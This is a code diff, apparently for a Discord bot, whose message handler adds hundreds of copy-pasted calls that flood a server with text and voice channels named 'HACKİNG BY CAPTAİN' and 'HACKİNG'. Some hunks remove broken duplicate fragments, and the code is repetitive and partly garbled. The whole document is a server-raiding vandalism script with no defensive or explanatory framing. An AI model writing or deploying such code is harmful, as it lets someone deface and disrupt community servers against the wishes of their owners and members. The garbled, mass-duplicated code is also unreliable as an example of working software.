+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -78,9 +10488,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -94,9 +10501,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -110,9 +10514,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -126,9 +10527,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -142,9 +10540,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -158,9 +10553,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -174,9 +10566,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -190,9 +10579,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -206,9 +10592,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -222,9 +10605,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -238,9 +10618,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -254,9 +10631,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -270,9 +10644,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -286,9 +10657,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -302,9 +10670,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -318,9 +10683,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -334,9 +10696,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -350,9 +10709,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -366,9 +10722,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -382,9 +10735,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -398,9 +10748,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -414,9 +10761,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -430,9 +10774,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -446,9 +10787,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -462,9 +10800,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -478,9 +10813,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -494,9 +10826,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -510,9 +10839,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -526,9 +10852,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -542,9 +10865,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -558,9 +10878,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -574,9 +10891,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -590,9 +10904,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -606,9 +10917,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -622,9 +10930,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -638,9 +10943,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -654,9 +10956,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -670,9 +10969,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -686,9 +10982,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -702,9 +10995,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -718,9 +11008,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -734,9 +11021,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -750,9 +11034,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -766,9 +11047,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -782,9 +11060,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -798,9 +11073,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -814,9 +11086,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -830,9 +11099,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -846,9 +11112,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -862,9 +11125,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -878,9 +11138,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -894,9 +11151,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -910,9 +11164,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -926,9 +11177,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -942,9 +11190,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -958,9 +11203,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -974,9 +11216,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -990,9 +11229,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1006,9 +11242,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1022,9 +11255,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1038,9 +11268,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1054,9 +11281,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1070,9 +11294,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1086,9 +11307,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1102,9 +11320,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1118,9 +11333,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1134,9 +11346,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1150,9 +11359,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1166,9 +11372,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1182,9 +11385,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1198,9 +11398,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1214,9 +11411,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1230,9 +11424,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1246,9 +11437,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1262,9 +11450,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1278,9 +11463,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1294,9 +11476,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1310,9 +11489,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1326,9 +11502,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1342,9 +11515,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1358,9 +11528,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1374,9 +11541,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1390,9 +11554,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1406,9 +11567,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1422,9 +11580,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1438,9 +11593,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
